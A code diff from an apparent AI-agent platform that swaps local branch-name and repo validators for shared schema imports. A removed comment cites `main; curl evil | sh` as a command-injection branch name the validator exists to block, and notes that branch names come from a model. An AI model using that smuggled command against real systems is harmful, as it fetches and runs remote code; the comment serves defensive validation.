@@ -1,7 +1,7 @@
 import { and, eq, gte, sql } from "drizzle-orm";
 import { z } from "zod";
 import { outboundMessages, suppressionList } from "@steward/db";
-import { CompanyProfile } from "@steward/schema";
+import { BranchName, CompanyProfile, RepoRef } from "@steward/schema";
 import { GitHubClient, VercelProvider, RenderProvider, StripeClient, SlackClient, TwilioClient, XClient, LinkedInClient, emailProviderFor, idempotencyKey, type DeployProvider } from "@steward/integrations";
 import { PrivacyService } from "@steward/core";
 import { ToolRegistry, defineTool, untrusted, webFetchTool, webSearchTool, type ToolContext, type ToolDefinition } from "@steward/tools";
@@ -560,22 +560,10 @@ async function github(s: AgentServices) {
   const { secret } = await s.integrations.resolveSecret(s.scope, integ.id);
   return GitHubClient.fromSecret(secret);
 }
-const repoRef = z.string().regex(/^[\w.-]+\/[\w.-]+$/, "owner/repo");
-/**
- * A git branch name, validated as a ref rather than trusted as text.
- *
- * Branch names are supplied by a model and then used to build sandbox commands, so a name like
- * `main; curl evil | sh` must be impossible, not merely unlikely. This applies git's own ref rules to the
- * cases that matter (no leading dash, no `..`, no `@{`, no `//`, no control characters or spaces) while the
- * push and commit paths additionally pass the ref through the environment instead of the command string.
- */
-const branchName = z
-  .string()
-  .min(1)
-  .max(200)
-  .regex(/^[A-Za-z0-9._/-]+$/, "must contain only letters, digits, dot, slash, dash or underscore")
-  .refine((v) => !v.startsWith("-") && !v.includes("..") && !v.includes("//") && !v.includes("@{"), "must be a valid git branch name")
-  .refine((v) => !v.endsWith("/") && !v.endsWith(".") && !v.endsWith(".lock") && !v.startsWith("/"), "must be a valid git branch name");
+// Both of these are the shared vocabulary: a repo reference and a branch name are validated the same way here, in
+// the code IDE and in the API, rather than three times with three chances to drift.
+const repoRef = RepoRef;
+const branchName = BranchName;
 const parseRepo = (full: string) => ({ owner: full.split("/")[0]!, repo: full.split("/")[1]! });
 
 const githubRepos = defineTool({
